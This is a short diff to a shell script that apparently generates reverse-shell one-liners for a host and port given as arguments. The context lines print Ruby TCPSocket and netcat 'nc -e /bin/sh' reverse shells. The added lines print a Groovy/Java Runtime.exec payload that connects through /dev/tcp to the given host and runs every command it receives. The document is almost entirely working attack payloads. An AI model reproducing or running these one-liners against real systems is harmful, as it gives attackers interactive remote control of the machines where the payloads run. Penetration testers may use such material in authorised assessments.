@@ -19,6 +19,9 @@ printf "\n\n"
 printf "ruby -rsocket -e'f=TCPSocket.open(\"$1\",$2).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
 printf "\n\n"
 
+printf "r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$1/$2;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[]);p.waitFor()"
+printf "\n\n"
+
 printf "nc -e /bin/sh $1 $2"
 printf "\n\n"
 
